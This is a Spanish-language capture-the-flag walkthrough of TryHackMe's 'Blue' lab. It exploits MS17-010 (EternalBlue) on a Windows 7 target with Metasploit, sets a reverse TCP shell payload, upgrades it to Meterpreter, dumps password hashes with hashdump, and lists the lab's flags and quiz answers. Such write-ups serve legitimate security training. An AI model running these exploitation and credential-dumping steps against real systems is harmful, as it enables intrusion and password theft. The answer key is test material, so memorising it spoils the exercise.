# Máquina Blue 

Dificultad --> Facil 

Instrucciones --> **Para poder resolver esta máquina tienes que registrarte en la página de TryHackMe y buscarla por el nombre de Blue**

'

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

'



![image](https://github.com/user-attachments/assets/b08829a0-8fb4-4231-a035-a8db5d887555)


## 1.Reconocmiento

Realizamos un escaneo de puertos con la herramienta Nmap para verificar los puertos abiertos

    sudo nmap  -sV --vv --script vuln 10.10.77.95

![image](https://github.com/user-attachments/assets/ed0458c6-4a84-43cf-8303-c80fdb6d0f61)


![image](https://github.com/user-attachments/assets/e12ca835-cf83-438b-af81-2e80e3bb3a23)


![image](https://github.com/user-attachments/assets/ff9dbd72-34c6-4bd4-bb3a-f16ed6c70e35)


### Resumen de la Información Obtenida

|IP           | Sistema OPerativo    | Puertos/Servicios              | 
|:----------: |:--------------------:| :-----------------------------:| 
| 10.10.77.95 | Windows 7            | 135 msrpc Windows RPC           |
|             |                      | 139 Netbios-ssn                 |
|             |                      | 445 microsoft-ds Windows 7 - 10 |
|             |                      | 3389 ssl/ms-wbt-server          |
|             |                      | 49152-49154 msrpc Windows RPC   |
|             |                      | 49158-49159 msrpc Windows RPC   |


## 2. Análisis de Vulnerabilidades / Debilidades

Buscamos el exploit en metasploit y elegimos la opción exploit/windows/smb/ms17_010_eternalblue

![image](https://github.com/user-attachments/assets/0263dd41-45d7-483f-ac12-3cc07f0c69bb)

Ahora aplicamos el comando

    show options

Y modificamos los parametros correspondientes

![image](https://github.com/user-attachments/assets/b73b2b49-c6a1-43ca-911e-6d3e87c161cd)


Luego vamos a modificar el payloads

    set payload windows/x64/shell/reverse_tcp


![image](https://github.com/user-attachments/assets/233898d9-4112-4d58-8ddc-9ab4384fd9fe)


## 3. Explotación


Una vez configurado todo procedemos a ejecutar run, al ya tener acceso vamos a ejecutar Ctrl+z para colocar en segundo plano esta sesión


![image](https://github.com/user-attachments/assets/ee036e90-ccbd-4084-a866-e3c9bc72e81d)


## 4. Escalación de privilegios


Ahora procedemos a escalar privilegios y vamos a busca una shell meterpreter

    search shell_to_meterpreter


![image](https://github.com/user-attachments/assets/23da4d99-d80c-4f8f-aff4-530eb7a8ae9e)



ejecutamos el comando:

    use 0

Una vez elegido procedemos a ejecutar 

    show options 

Para ver los parámetros a modificar


![image](https://github.com/user-attachments/assets/24db7c16-3ab6-4e48-ac37-0a1a765b03bd)


Modificaos la sesión y el Lhost


![image](https://github.com/user-attachments/assets/6b25c583-40e3-4935-9fd8-41fea60896d4)


Ejecutamos nuevamente run y luego colocamos sessions -i 2 porque nos indica que la sesión de meterprter es la sesión 2


![image](https://github.com/user-attachments/assets/b5edab97-06b5-400e-9a81-e7fed35388ca)


Ejecutamos el comando 

    hashdump

Para visualizar los hash de los usuarios de windows


![image](https://github.com/user-attachments/assets/5a663a93-e909-4a6d-8f8d-95de699b63a7)


Codificamos el hash de jon:  alqfna22


![image](https://github.com/user-attachments/assets/eb8dd35b-bf30-45ca-965c-fce9d0e973ab)



ahora ejecutamos el comando shell y nos vamos al directorio C en búsqueda de la bandera 1 🚩

flag{access_the_machine}

![image](https://github.com/user-attachments/assets/5433f494-8509-4df5-bce3-18c1de55e04b)


Siguiendo las pistas que nos indican en TryHackMe nos vamos a los siguientes directorios y conseguimos la bandera 2 🚩


![image](https://github.com/user-attachments/assets/11a2035d-4dc6-4707-834b-eeec454935d3)


Vemos el contenido de la bandera 2🚩 : flag{sam_database_elevated_access}


![image](https://github.com/user-attachments/assets/e9947b6d-c9c2-4dcc-b8d9-529f31888f10)


Continuamos las pistas que nos indican en TryHackMe nos vamos a los siguientes directorios y conseguimos la bandera 3 🚩


![image](https://github.com/user-attachments/assets/e9b0899b-39bd-4842-b0fd-c36ba838cb65)


Vemos el contenido de la bandera 3 🚩: flag{admin_documents_can_be_valuable}


![image](https://github.com/user-attachments/assets/f66a8600-5180-441d-8631-2e896d0f7b11)



## 4.Banderas 🏁

| flag1.txt | flag{access_the_machine               |
|:---------:|:-------------------------------------:|
| flag2.txt | flag{sam_database_elevated_access}    |
| flag3.txt | flag{admin_documents_can_be_valuable} |


## 5.Extra 🚨

### Acá las respuesta del cuestionario de TryHackMe 


- How many ports are open with a port number under 1000?

3

- What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

ms17-010

- Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

exploit/windows/smb/ms17_010_eternalblue

- Show options and set the one required value. What is the name of this value? (All caps for submission)

RHOSTS

- If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

post/multi/manage/shell_to_meterpreter

- Select this (use MODULE_PATH). Show options, what option are we required to change?

SESSION

- Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

Jon

- Copy this password hash to a file and research how to crack it. What is the cracked password?

alqfna22

- Flag1? This flag can be found at the system root.

flag{access_the_machine}

- Flag2? This flag can be found at the location where passwords are stored within Windows.

flag{sam_database_elevated_access}

- flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.



















































































